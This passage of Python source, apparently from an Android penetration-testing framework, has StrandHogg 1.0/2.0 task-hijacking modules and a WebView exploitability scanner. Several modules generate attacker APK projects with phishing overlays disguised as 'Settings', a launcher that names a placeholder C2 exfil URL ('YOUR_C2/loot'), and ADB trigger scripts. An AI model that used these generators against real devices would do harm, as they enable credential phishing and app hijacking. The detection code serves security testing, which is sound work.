                        raise Exception(f"Installation failed: {result.stderr}")
                    
                    print(Fore.GREEN + "[+] Patched APK installed successfully" + Fore.RESET)
                    
                    # Extract via run-as
                    print(Fore.YELLOW + "[*] Extracting data via run-as..." + Fore.RESET)
                    self._other_tools.extract_backup(method="runas")
                    
                except Exception as e:
                    print(Fore.RED + f"[-] Patching failed: {e}" + Fore.RESET)
                    print(Fore.YELLOW + "[!] Falling back to legacy method..." + Fore.RESET)
                    self._other_tools.extract_backup(method="legacy")
            else:
                # Use mmsf_other_tools for other methods
                self._other_tools.extract_backup(method=method)
            
            return 1
            
        elif cmd == "show":
            print_show_table([
                {"name": "APP", "value": self._other_tools.config["app"], "description": "Package name"},
                {"name": "PATH", "value": self._other_tools.config["path"], "description": "Output directory"}
            ])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            return 2

    def taskhijacking(self, cmd, data):
        import os, xml.etree.ElementTree as ET
        from Classes.constants import Constants

        mode = data.get("mode", "detect")

        if cmd == "run":
            # ── DETECT mode ──────────────────────────────────────
            if mode == "detect":
                manifest_path = data.get("manifest_path", "")
                if not manifest_path:
                    for root, dirs, files in os.walk("apktool_files"):
                        for f in files:
                            if f == "AndroidManifest.xml":
                                manifest_path = os.path.join(root, f)
                                break
                        if manifest_path:
                            break
                if not manifest_path or not os.path.exists(manifest_path):
                    print(Fore.RED + "[-] AndroidManifest.xml not found. Set manifest_path or decompile first." + Fore.RESET)
                    return 0
                try:
                    tree = ET.parse(manifest_path)
                    root_elem = tree.getroot()
                    ns = "http://schemas.android.com/apk/res/android"
                    package = root_elem.get("package", "unknown")
                    print(Fore.CYAN + f"\n[*] Scanning: {manifest_path}" + Fore.RESET)
                    print(Fore.CYAN + f"[*] Package : {package}" + Fore.RESET)
                    sdk_node = root_elem.find(".//uses-sdk")
                    min_sdk = 0
                    if sdk_node is not None:
                        try:
                            min_sdk = int(sdk_node.get(f"{{{ns}}}minSdkVersion", "0"))
                        except ValueError:
                            pass
                    if min_sdk >= 30:
                        print(Fore.YELLOW + f"[!] minSdkVersion={min_sdk} — OS patch present (Android 11+)." + Fore.RESET)
                    else:
                        print(Fore.GREEN + f"[+] minSdkVersion={min_sdk} — Potentially vulnerable to StrandHogg 1.0!" + Fore.RESET)
                    vulnerable = []
                    for activity in root_elem.iter("activity"):
                        if activity.get(f"{{{ns}}}launchMode", "") == "singleTask":
                            vulnerable.append({
                                "activity": activity.get(f"{{{ns}}}name", "unknown"),
                                "taskAffinity": activity.get(f"{{{ns}}}taskAffinity", f"{package} (default)"),
                                "exported": activity.get(f"{{{ns}}}exported", "false")
                            })
                    if vulnerable:
                        print(Fore.RED + f"\n[!] {len(vulnerable)} singleTask activity(ies) found:\n" + Fore.RESET)
                        for v in vulnerable:
                            print(Fore.RED + f"    Activity    : {v['activity']}" + Fore.RESET)
                            print(Fore.YELLOW + f"    taskAffinity: {v['taskAffinity']}" + Fore.RESET)
                            print(Fore.YELLOW + f"    exported    : {v['exported']}\n" + Fore.RESET)
                    else:
                        print(Fore.GREEN + "[+] No singleTask activities found." + Fore.RESET)
                    return 1
                except ET.ParseError as e:
                    print(Fore.RED + f"[-] Parse error: {e}" + Fore.RESET)
                    return 0

            # ── GENERATE mode ────────────────────────────────────
            elif mode == "generate":
                target_pkg = data.get("target_package", "")
                target_act = data.get("target_activity", "")
                if not target_pkg or not target_act:
                    print(Fore.RED + "[-] Set target_package and target_activity first." + Fore.RESET)
                    return 0
                attacker_pkg = data.get("attacker_package", "com.evil.hijack")
                phish_text = data.get("phishing_text", "Session expired.")
                loot = data.get("loot_path", Constants.DIR_LOOT_PATH.value)
                os.makedirs(loot, exist_ok=True)

                manifest = f"""<activity
    android:name=".HijackActivity"
    android:taskAffinity="{target_pkg}"
    android:launchMode="singleTask"
    android:allowTaskReparenting="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>"""
                java = f"""package {attacker_pkg};
// StrandHogg 1.0 — HijackActivity
// taskAffinity set to: {target_pkg}
// Overlay text: {phish_text}
// Add this to your attacker APK and set taskAffinity in manifest.
"""
                trigger = f"""#!/bin/bash
adb shell am start -n {attacker_pkg}/.HijackActivity --activity-task-on-home
"""
                with open(os.path.join(loot, "taskhijack_manifest.xml"), "w") as f:
                    f.write(manifest)
                with open(os.path.join(loot, "HijackActivity.java"), "w") as f:
                    f.write(java)
                with open(os.path.join(loot, "trigger.sh"), "w") as f:
                    f.write(trigger)
                os.chmod(os.path.join(loot, "trigger.sh"), 0o755)
                print(Fore.GREEN + f"[+] Payload saved to {loot}" + Fore.RESET)
                return 1

        elif cmd == "show":
            print_show_table([
                {"name": "MODE",             "value": data.get("mode", "detect"),          "description": "detect | generate"},
                {"name": "MANIFEST_PATH",    "value": data.get("manifest_path", ""),       "description": "Path to AndroidManifest.xml (detect mode)", "required": False},
                {"name": "TARGET_PACKAGE",   "value": data.get("target_package", ""),      "description": "Victim app package (generate mode)"},
                {"name": "TARGET_ACTIVITY",  "value": data.get("target_activity", ""),     "description": "Victim main activity (generate mode)"},
                {"name": "ATTACKER_PACKAGE", "value": data.get("attacker_package", ""),    "description": "Attacker package name", "required": False},
                {"name": "PHISHING_TEXT",    "value": data.get("phishing_text", ""),       "description": "Fake login screen text", "required": False},
                {"name": "LOOT_PATH",        "value": data.get("loot_path", ""),           "description": "Output directory", "required": False},
            ])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def strandhogg(self, cmd, data):
        import subprocess, os
        from subprocess import PIPE
        from Classes.constants import Constants

        mode = data.get("mode", "check")

        if cmd == "run":
            # ── CHECK mode ───────────────────────────────────────
            if mode == "check":
                try:
                    api = int(subprocess.run(
                        ["adb", "shell", "getprop", "ro.build.version.sdk"],
                        capture_output=True, text=True, timeout=10).stdout.strip())
                    patch = subprocess.run(
                        ["adb", "shell", "getprop", "ro.build.version.security_patch"],
                        capture_output=True, text=True, timeout=10).stdout.strip()
                    ver = subprocess.run(
                        ["adb", "shell", "getprop", "ro.build.version.release"],
                        capture_output=True, text=True, timeout=10).stdout.strip()
                    print(Fore.CYAN + f"\n[*] Android {ver} (API {api}) | Patch: {patch}" + Fore.RESET)
                    if api <= 28:
                        print(Fore.RED + "[!!!] FULLY VULNERABLE to StrandHogg 2.0 (CVE-2020-0096)" + Fore.RESET)
                    elif api == 29 and patch < "2020-05-01":
                        print(Fore.RED + "[!!!] VULNERABLE — Android 10 without May 2020 patch" + Fore.RESET)
                    else:
                        print(Fore.GREEN + "[+] Patched — StrandHogg 2.0 not exploitable on this device." + Fore.RESET)
                    return 1
                except Exception as e:
                    print(Fore.RED + f"[-] ADB error: {e}" + Fore.RESET)
                    return 0

            # ── GENERATE mode ────────────────────────────────────
            elif mode == "generate":
                targets = data.get("multi_target") or ([data["target_package"]] if data.get("target_package") else [])
                if not targets:
                    print(Fore.RED + "[-] Set target_package or add_target first." + Fore.RESET)
                    return 0
                loot = data.get("loot_path", Constants.DIR_LOOT_PATH.value)
                os.makedirs(loot, exist_ok=True)
                c2 = data.get("c2_url", "http://YOUR_C2/loot")
                phish = data.get("phishing_text", "Session expired.")
                attacker = data.get("attacker_package", "com.evil.strandhogg2")

                java = f"""package {attacker};
// StrandHogg 2.0 — CVE-2020-0096
// Targets: {', '.join(targets)}
// Uses startActivities(Intent[]) — no manifest config needed
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import java.util.ArrayList;
public class StrandHogg2Launcher extends Activity {{
    @Override
    protected void onCreate(Bundle b) {{
        super.onCreate(b);
        ArrayList<Intent> intents = new ArrayList<>();
        Intent phish = new Intent(this, PhishingOverlayActivity.class);
        phish.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
        intents.add(0, phish);
"""
                for pkg in targets:
                    java += f"""        Intent i_{pkg.replace('.','_')} = getPackageManager().getLaunchIntentForPackage("{pkg}");
        if (i_{pkg.replace('.','_')} != null) intents.add(i_{pkg.replace('.','_')});
"""
                java += f"""        startActivities(intents.toArray(new Intent[0]));
        finish();
    }}
}}
// C2: {c2} | Phish text: {phish}
"""
                trigger = f"""#!/bin/bash
adb shell am start -n {attacker}/.StrandHogg2Launcher
"""
                with open(os.path.join(loot, "StrandHogg2Payload.java"), "w") as f:
                    f.write(java)
                with open(os.path.join(loot, "strandhogg2_trigger.sh"), "w") as f:
                    f.write(trigger)
                os.chmod(os.path.join(loot, "strandhogg2_trigger.sh"), 0o755)
                print(Fore.GREEN + f"[+] StrandHogg 2.0 payload saved to {loot}" + Fore.RESET)
                print(Fore.YELLOW + f"[*] Targets: {', '.join(targets)}" + Fore.RESET)
                return 1

        elif cmd == "show":
            print_show_table([
                {"name": "MODE",             "value": data.get("mode", "check"),            "description": "check | generate"},
                {"name": "TARGET_PACKAGE",   "value": data.get("target_package", ""),       "description": "Primary victim app package"},
                {"name": "ADD_TARGET",       "value": str(data.get("multi_target", [])),    "description": "Additional targets (StrandHogg 2.0 hits multiple)", "required": False},
                {"name": "ATTACKER_PACKAGE", "value": data.get("attacker_package", ""),     "description": "Attacker package name", "required": False},
                {"name": "C2_URL",           "value": data.get("c2_url", ""),               "description": "Exfil endpoint", "required": False},
                {"name": "PHISHING_TEXT",    "value": data.get("phishing_text", ""),        "description": "Fake screen text", "required": False},
                {"name": "LOOT_PATH",        "value": data.get("loot_path", ""),            "description": "Output directory", "required": False},
            ])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
    
    # ─────────────────────────────────────────────────────────────────────────────
# TASK HIJACKING (StrandHogg) methods
# ─────────────────────────────────────────────────────────────────────────────

    def taskhijacking_detect(self, cmd, data):
        """
        Parse a decoded AndroidManifest.xml for the StrandHogg 1.0 triplet:
          - launchMode="singleTask"      on any <activity>
          - taskAffinity=""              on that same <activity>
          - allowTaskReparenting="true"  on <application>
        Also flags targetSdkVersion <= 28 (required for the attack to work).
        """
        if cmd == "run":
            manifest = data.get("manifest_path", "")
            if not manifest:
                print(Fore.RED + "[-] Set MANIFEST_PATH first!" + Fore.RESET)
                return 0
            if not os.path.isfile(manifest):
                print(Fore.RED + f"[-] File not found: {manifest}" + Fore.RESET)
                return 0

            print(Fore.YELLOW + f"[*] Analysing {manifest}" + Fore.RESET)
            content = open(manifest).read()

            findings = []

            # allowTaskReparenting on <application>
            if re.search(r'allowTaskReparenting\s*=\s*"true"', content):
                findings.append(("CRITICAL", "allowTaskReparenting=\"true\" found on <application>"))

            # singleTask + taskAffinity on any activity
            activities = re.findall(r'<activity[\s\S]*?(?:</activity>|/>)', content)
            for act in activities:
                name_m = re.search(r'android:name\s*=\s*"([^"]+)"', act)
                aname  = name_m.group(1) if name_m else "(unknown)"
                has_single = re.search(r'launchMode\s*=\s*"singleTask"', act)
                has_affinity = re.search(r'taskAffinity\s*=\s*""', act)
                if has_single:
                    findings.append(("HIGH", f"launchMode=singleTask on activity: {aname}"))
                if has_affinity:
                    findings.append(("HIGH", f"taskAffinity=\"\" (empty) on activity: {aname}"))
                if has_single and has_affinity:
                    findings.append(("CRITICAL", f"STRANDHOGG CANDIDATE: {aname} — singleTask + empty taskAffinity"))

            # targetSdkVersion
            sdk_m = re.search(r'targetSdkVersion\s*=\s*"(\d+)"', content)
            if sdk_m:
                sdk = int(sdk_m.group(1))
                if sdk <= 28:
                    findings.append(("HIGH", f"targetSdkVersion={sdk} (≤28) — task hijacking NOT mitigated by platform"))
                else:
                    findings.append(("INFO", f"targetSdkVersion={sdk} (≥29) — platform partially mitigates StrandHogg 1.0"))

            if not findings:
                print(Fore.GREEN + "[+] No task hijacking indicators found." + Fore.RESET)
            else:
                print(Fore.CYAN + "\n[Task Hijacking Scan Results]" + Fore.RESET)
                for severity, msg in findings:
                    colour = Fore.RED if severity == "CRITICAL" else Fore.YELLOW if severity == "HIGH" else Fore.BLUE
                    print(colour + f"  [{severity}] {msg}" + Fore.RESET)
            return 1

        elif cmd == "show":
            print_show_table([
                {"name": "MANIFEST_PATH", "value": data.get("manifest_path", ""),
                 "description": "Absolute path to the decoded AndroidManifest.xml (apktool output)"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def taskhijacking_generate(self, cmd, data):
        """
        Scaffold an attacker APK source directory.
        The generated project has:
          - taskAffinity = <target_package>  (same as victim → reparenting)
          - launchMode   = singleTask
          - allowTaskReparenting = true
        Build with: ./gradlew assembleDebug  →  sign  →  adb install
        """
        if cmd == "run":
            pkg = data.get("target_package", "")
            if not pkg:
                print(Fore.RED + "[-] Set TARGET_PACKAGE first!" + Fore.RESET)
                return 0

            act      = data.get("target_activity", ".MainActivity")
            txt      = data.get("phishing_text", "Session expired. Please login again.")
            out_dir  = data.get("out_dir", os.path.expanduser("~/.mmsf/loot/taskhijacking/"))
            att_pkg  = "com.mmsf.attacker"
            proj_dir = os.path.join(out_dir, "attacker_apk")

            os.makedirs(os.path.join(proj_dir, "app/src/main/java/com/mmsf/attacker"), exist_ok=True)
            os.makedirs(os.path.join(proj_dir, "app/src/main/res/layout"), exist_ok=True)
            os.makedirs(os.path.join(proj_dir, "app/src/main/res/values"), exist_ok=True)

            # AndroidManifest.xml — the vulnerable triplet lives HERE in the attacker app
            manifest = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{att_pkg}">

    <application
        android:allowBackup="true"
        android:allowTaskReparenting="true"
        android:label="@string/app_name">

        <activity
            android:name=".PhishActivity"
            android:taskAffinity="{pkg}"
            android:launchMode="singleTask"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
"""
            # PhishActivity.java
            java = f"""package com.mmsf.attacker;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.LinearLayout;
import android.view.Gravity;
import android.graphics.Color;

public class PhishActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        // Mimic victim package colours / branding at runtime
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.WHITE);

        TextView tv = new TextView(this);
        tv.setText("{txt}");
        tv.setTextSize(20f);
        tv.setTextColor(Color.BLACK);
        tv.setGravity(Gravity.CENTER);
        tv.setPadding(48, 48, 48, 48);

        layout.addView(tv);
        setContentView(layout);
    }}
}}
"""
            # build.gradle (app)
            build_app = """apply plugin: 'com.android.application'

android {
    compileSdkVersion 28
    defaultConfig {
        applicationId "com.mmsf.attacker"
        minSdkVersion 21
        targetSdkVersion 28
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release { minifyEnabled false }
    }
}
dependencies {
    implementation 'androidx.appcompat:appcompat:1.2.0'
}
"""
            # root build.gradle
            build_root = """buildscript {
    repositories { google(); mavenCentral() }
    dependencies { classpath 'com.android.tools.build:gradle:4.2.2' }
}
allprojects { repositories { google(); mavenCentral() } }
"""
            # settings.gradle
            settings = """include ':app'
rootProject.name = "MmsfAttacker"
"""
            # strings.xml
            strings = """<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Settings</string>
</resources>
"""
            # Write all files
            def write(path, content):
                with open(path, "w") as f:
                    f.write(content)

            write(os.path.join(proj_dir, "app/src/main/AndroidManifest.xml"), manifest)
            write(os.path.join(proj_dir, "app/src/main/java/com/mmsf/attacker/PhishActivity.java"), java)
            write(os.path.join(proj_dir, "app/build.gradle"), build_app)
            write(os.path.join(proj_dir, "build.gradle"), build_root)
            write(os.path.join(proj_dir, "settings.gradle"), settings)
            write(os.path.join(proj_dir, "app/src/main/res/values/strings.xml"), strings)

            print(Fore.GREEN + f"\n[+] Attacker project written to: {proj_dir}" + Fore.RESET)
            print(Fore.YELLOW + f"[*] Target package  : {pkg}" + Fore.RESET)
            print(Fore.YELLOW + f"[*] Phishing text   : {txt}" + Fore.RESET)
            print(Fore.CYAN   + "\n[*] Build steps:" + Fore.RESET)
            print(Fore.WHITE  + f"    cd {proj_dir}" + Fore.RESET)
            print(Fore.WHITE  + "    ./gradlew assembleDebug" + Fore.RESET)
            print(Fore.WHITE  + "    adb install app/build/outputs/apk/debug/app-debug.apk" + Fore.RESET)
            print(Fore.CYAN   + "\n[*] Then trigger with:" + Fore.RESET)
            print(Fore.WHITE  + f"    adb shell am start -n {pkg}/{act}" + Fore.RESET)
            print(Fore.WHITE  + "    # Press Home → reopen victim app → attacker overlay appears" + Fore.RESET)
            return 1

        elif cmd == "show":
            print_show_table([
                {"name": "TARGET_PACKAGE",   "value": data.get("target_package", ""),   "description": "Victim package: e.g. com.mmsf.taskhijackingvictim"},
                {"name": "TARGET_ACTIVITY",  "value": data.get("target_activity", ""),  "description": "Victim main activity: e.g. .MainActivity", "required": False},
                {"name": "PHISHING_TEXT",    "value": data.get("phishing_text", ""),    "description": "Text shown in the overlay screen", "required": False},
                {"name": "OUT_DIR",          "value": data.get("out_dir", ""),          "description": "Output directory for the generated project", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def taskhijacking_trigger(self, cmd, data):
        """
        Trigger the StrandHogg attack live via ADB:
          1. Launch victim to prime its task stack
          2. Press HOME (keyevent 3) to background it
          3. Launch attacker — it reparents into the victim's task
        """
        if cmd == "run":
            pkg = data.get("target_package", "")
            act = data.get("target_activity", ".MainActivity")
            att = data.get("attacker_package", "com.mmsf.attacker")
            if not pkg:
                print(Fore.RED + "[-] Set TARGET_PACKAGE first!" + Fore.RESET)
                return 0

            adb = Constants.ADB.value

            def _trigger():
                print(Fore.YELLOW + "[*] Step 1: Launch victim app..." + Fore.RESET)
                subprocess.run(f"{adb} shell am start -n {pkg}/{act}".split(),
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                import time; time.sleep(2)

                print(Fore.YELLOW + "[*] Step 2: Press HOME to background victim..." + Fore.RESET)
                subprocess.run(f"{adb} shell input keyevent 3".split(),
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(1)

                print(Fore.YELLOW + "[*] Step 3: Launch attacker — hijacking victim task..." + Fore.RESET)
                subprocess.run(f"{adb} shell monkey -p {att} -c android.intent.category.LAUNCHER 1".split(),
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2)

                print(Fore.YELLOW + "[*] Step 4: Press recents, tap victim — overlay should appear..." + Fore.RESET)
                subprocess.run(f"{adb} shell am start -n {pkg}/{act}".split(),
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                print(Fore.GREEN + "[+] Trigger sequence complete. Check device screen." + Fore.RESET)

            threading.Thread(target=_trigger, args=([])).start()
            return 1

        elif cmd == "show":
            print_show_table([
                {"name": "TARGET_PACKAGE",   "value": data.get("target_package", ""),   "description": "Victim app package: com.mmsf.taskhijackingvictim"},
                {"name": "TARGET_ACTIVITY",  "value": data.get("target_activity", ""),  "description": "Victim main activity: .MainActivity", "required": False},
                {"name": "ATTACKER_PACKAGE", "value": data.get("attacker_package", ""), "description": "Attacker package installed on device. Default: com.mmsf.attacker", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

# ─────────────────────────────────────────────────────────────────────────────
# WEBVIEW methods
# ─────────────────────────────────────────────────────────────────────────────

# ─── Drop-in replacement for webview_detect() in MassiveMobileSecurityFramework ───

    def webview_detect(self, cmd, data):
        """
        Deep WebView exploitability analysis.

        Per-class inspection:
          • Which WebSettings flags are set (and to what value)
          • Whether loadUrl / loadData / loadDataWithBaseURL is called
          • Whether the URL source is user-controlled (intent / deeplink)
          • Whether addJavascriptInterface is present and what interface names
          • Whether shouldOverrideUrlLoading is missing or returns false (open-redirect)
          • Whether onReceivedSslError calls handler.proceed() (cert bypass)
          • Whether DOM Storage / mixed content / universal file access is on

        Manifest correlation:
          • Map class → Activity name
          • Check exported=true / intent-filter with <data> scheme
          • targetSdkVersion (< 29 → StrandHogg, < 17 → JS-interface RCE)

        Exploit chain synthesis:
          Chain A  JS-interface RCE   exported + JS + addJavascriptInterface + user URL
          Chain B  File exfiltration  exported + universalFileAccess + JS + user URL
          Chain C  Open redirect      exported + no shouldOverrideUrlLoading + user URL
          Chain D  SSL MITM           exported + onReceivedSslError.proceed()
          Chain E  XSS via deeplink   exported + JS + user-controlled URL (no interface)
        """
        import glob, xml.etree.ElementTree as ET

        if cmd == "run":
            apk_path     = data.get("apk_path", "")
            decoded_path = data.get("decoded_path", "")

            if not apk_path and not decoded_path:
                print(Fore.RED + "[-] Set APK_PATH or DECODED_PATH first!" + Fore.RESET)
                return 0

            # ── Decode APK if needed ──────────────────────────────────────────
            if apk_path and not decoded_path:
                decoded_path = apk_path.replace(".apk", "_decoded")
                if not os.path.isdir(decoded_path):
                    print(Fore.YELLOW + f"[*] Decoding APK → {decoded_path} ..." + Fore.RESET)
                    r = subprocess.run(
                        ["apktool", "d", "-f", apk_path, "-o", decoded_path],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    if r.returncode != 0:
                        print(Fore.RED + "[-] apktool decode failed:\n" + r.stderr.decode() + Fore.RESET)
                        return 0
                else:
                    print(Fore.YELLOW + f"[*] Reusing existing decoded dir: {decoded_path}" + Fore.RESET)

            print(Fore.CYAN + "\n" + "="*72 + Fore.RESET)
            print(Fore.GREEN + "  MMSF  WebView Deep Exploitability Analysis" + Fore.RESET)
            print(Fore.CYAN + "="*72 + "\n" + Fore.RESET)

            # ── 1. Parse AndroidManifest ──────────────────────────────────────
            manifest_path = os.path.join(decoded_path, "AndroidManifest.xml")
            exported_activities  = set()   # package-qualified activity names
            deeplink_activities  = set()   # activities with <data> scheme in intent-filter
            target_sdk           = None
            app_package          = ""
            reparenting_on       = False

            if os.path.isfile(manifest_path):
                try:
                    tree = ET.parse(manifest_path)
                    root = tree.getroot()
                    ns   = "http://schemas.android.com/apk/res/android"
                    app_package = root.get("package", "")

                    sdk_el = root.find(".//uses-sdk")
                    if sdk_el is not None:
                        ts = sdk_el.get(f"{{{ns}}}targetSdkVersion")
                        if ts:
                            target_sdk = int(ts)

                    app_el = root.find("application")
                    if app_el is not None:
                        rtr = app_el.get(f"{{{ns}}}allowTaskReparenting", "false")
                        reparenting_on = rtr.lower() == "true"

                    for act in root.findall(".//activity"):
                        raw_name  = act.get(f"{{{ns}}}name", "")
                        exp_val   = act.get(f"{{{ns}}}exported", "")
                        # Normalise name to fully-qualified
                        if raw_name.startswith("."):
                            full_name = app_package + raw_name
                        elif "." not in raw_name:
                            full_name = app_package + "." + raw_name
                        else:
                            full_name = raw_name

                        has_filter = act.find("intent-filter") is not None

                        # exported is implied true when intent-filter exists (pre-API31 default)
                        if exp_val.lower() == "true" or (has_filter and exp_val == ""):
                            exported_activities.add(full_name)

                        # Check for deeplink <data> scheme
                        for ifilter in act.findall("intent-filter"):
                            for delem in ifilter.findall("data"):
                                scheme = delem.get(f"{{{ns}}}scheme", "")
                                if scheme:
                                    deeplink_activities.add(full_name)
                                    exported_activities.add(full_name)
                except Exception as ex:
                    print(Fore.YELLOW + f"[!] Manifest parse warning: {ex}" + Fore.RESET)
            else:
                print(Fore.YELLOW + "[!] AndroidManifest.xml not found — skipping manifest correlation" + Fore.RESET)

            # ── 2. Per-class smali analysis ───────────────────────────────────
            #
            # Data model per class:
            #   class_findings[smali_path] = {
            #       "class":           str,   # Landroid/...; style
            #       "js_enabled":      bool,
            #       "js_disabled":     bool,
            #       "file_access":     bool,
            #       "univ_file":       bool,
            #       "file_from_file":  bool,
            #       "mixed_content":   bool,
            #       "dom_storage":     bool,
            #       "add_js_iface":    list[str],   # interface names
            #       "load_url":        bool,
            #       "load_data":       bool,
            #       "url_from_intent": bool,   # getStringExtra / getData() near loadUrl
            #       "no_override_url": bool,   # extends WebViewClient but no shouldOverrideUrlLoading
            #       "ssl_proceed":     bool,   # onReceivedSslError calls proceed()
            #       "is_webviewclient":bool,
            #       "is_activity":     bool,
            #       "activity_fqn":    str,    # fully-qualified Java class name
            #   }

            class_data = {}

            smali_files = glob.glob(
                os.path.join(decoded_path, "**/*.smali"), recursive=True
            )

            for smali_path in smali_files:
                try:
                    raw = open(smali_path, errors="ignore").read()
                except Exception:
                    continue

                # Class name from .class directive
                cm = re.search(r'^\.class\s+.*?(L[^\s;]+;)', raw, re.M)
                if not cm:
                    continue
                smali_class = cm.group(1)                          # e.g. Lcom/example/MainActivity;
                java_class  = smali_class[1:].replace("/", ".").rstrip(";")
                fname       = os.path.basename(smali_path)

                d = {
                    "class":           java_class,
                    "fname":           fname,
                    "js_enabled":      False,
                    "js_disabled":     False,
                    "file_access":     False,
                    "univ_file":       False,
                    "file_from_file":  False,
                    "mixed_content":   False,
                    "dom_storage":     False,
                    "add_js_iface":    [],
                    "load_url":        False,
                    "load_data":       False,
                    "url_from_intent": False,
                    "no_override_url": False,
                    "ssl_proceed":     False,
                    "is_webviewclient":False,
                    "is_activity":     False,
                    "activity_fqn":    "",
                }

                # Superclass
                super_m = re.search(r'^\.super\s+(L[^\s;]+;)', raw, re.M)
                if super_m:
                    sup = super_m.group(1)
                    if "Activity" in sup or "Fragment" in sup:
                        d["is_activity"] = True
                        d["activity_fqn"] = java_class
                    if "WebViewClient" in sup:
                        d["is_webviewclient"] = True

                # WebSettings flags —
                #   smali calls look like:
                #   invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
                #   const/4 v1, 0x1   (true) or 0x0 (false)
                #   We look at the const just before the invoke.
                def flag_value(method_name):
                    """Return True/False/None based on boolean arg to a WebSettings setter."""
                    pat = re.compile(
                        r'((?:const(?:/4|/16|))\s+\S+,\s+(0x[01]))\s*\n'
                        r'(?:.*\n){0,3}'
                        r'.*invoke-virtual.*WebSettings;->' + re.escape(method_name),
                        re.M
                    )
                    m = pat.search(raw)
                    if m:
                        return m.group(2) == "0x1"
                    # Fallback: just presence
                    if re.search(r'WebSettings;->' + re.escape(method_name), raw):
                        return True          # assume true if we can't determine value
                    return None

                js_val = flag_value("setJavaScriptEnabled(Z)V")
                if js_val is True:
                    d["js_enabled"] = True
                elif js_val is False:
                    d["js_disabled"] = True

                if flag_value("setAllowFileAccess(Z)V") is True:
                    d["file_access"] = True
                if flag_value("setAllowUniversalAccessFromFileURLs(Z)V") is True:
                    d["univ_file"] = True
                if flag_value("setAllowFileAccessFromFileURLs(Z)V") is True:
                    d["file_from_file"] = True
                if flag_value("setDomStorageEnabled(Z)V") is True:
                    d["dom_storage"] = True
                if flag_value("setMixedContentMode(I)V") is not None:
                    # 0 = MIXED_CONTENT_ALWAYS_ALLOW
                    mc_pat = re.compile(
                        r'const(?:/4|/16|)\s+\S+,\s+(0x0)\s*\n'
                        r'(?:.*\n){0,3}'
                        r'.*WebSettings;->setMixedContentMode', re.M)
                    if mc_pat.search(raw):
                        d["mixed_content"] = True

                # addJavascriptInterface  — grab the string constant (interface name)
                for m in re.finditer(
                    r'const-string\s+\S+,\s+"([^"]+)"\s*\n'
                    r'(?:.*\n){0,4}'
                    r'.*WebView;->addJavascriptInterface',
                    raw, re.M
                ):
                    d["add_js_iface"].append(m.group(1))
                # Fallback: just detect presence
                if not d["add_js_iface"] and "WebView;->addJavascriptInterface" in raw:
                    d["add_js_iface"].append("(name unknown)")

                # loadUrl / loadData
                if "WebView;->loadUrl(" in raw:
                    d["load_url"] = True
                if re.search(r'WebView;->loadData\b|WebView;->loadDataWithBaseURL', raw):
                    d["load_data"] = True

                # User-controlled URL: getIntent / getStringExtra / getData near loadUrl
                if d["load_url"] or d["load_data"]:
                    if re.search(r'getIntent\(\)|getStringExtra|getDataString\(\)|getData\(\)', raw):
                        d["url_from_intent"] = True

                # shouldOverrideUrlLoading — only relevant in WebViewClient subclasses
                if d["is_webviewclient"]:
                    if "shouldOverrideUrlLoading" not in raw:
                        d["no_override_url"] = True

                # onReceivedSslError — does it call proceed()?
                ssl_m = re.search(
                    r'onReceivedSslError[\s\S]{0,500}SslErrorHandler;->proceed\(\)', raw
                )
                if ssl_m:
                    d["ssl_proceed"] = True

                # Only store if something WebView-related was found
                interesting = (
                    d["js_enabled"] or d["univ_file"] or d["file_from_file"]
                    or d["add_js_iface"] or d["load_url"] or d["load_data"]
                    or d["ssl_proceed"] or d["no_override_url"] or d["mixed_content"]
                )
                if interesting:
                    class_data[smali_path] = d

            if not class_data:
                print(Fore.GREEN + "[+] No WebView usage found in smali." + Fore.RESET)
                return 1

            # ── 3. Manifest-level summary ─────────────────────────────────────
            print(Fore.CYAN + "── Manifest Summary " + "─"*52 + Fore.RESET)
            sdk_str = str(target_sdk) if target_sdk else "unknown"
            sdk_warn = ""
            if target_sdk and target_sdk < 17:
                sdk_warn = Fore.RED + "  ⚠ <17: addJavascriptInterface is FULLY RCE (no @JavascriptInterface needed)" + Fore.RESET
            elif target_sdk and target_sdk < 29:
                sdk_warn = Fore.YELLOW + "  ⚠ <29: Task hijacking (StrandHogg) not mitigated" + Fore.RESET
            print(f"  Package         : {Fore.WHITE}{app_package or '(unknown)'}{Fore.RESET}")
            print(f"  targetSdkVersion: {Fore.WHITE}{sdk_str}{Fore.RESET}{sdk_warn}")
            print(f"  Exported acts   : {Fore.WHITE}{len(exported_activities)}{Fore.RESET}  → {', '.join(list(exported_activities)[:4]) or 'none'}")
            print(f"  Deeplink acts   : {Fore.WHITE}{len(deeplink_activities)}{Fore.RESET}  → {', '.join(list(deeplink_activities)[:4]) or 'none'}")
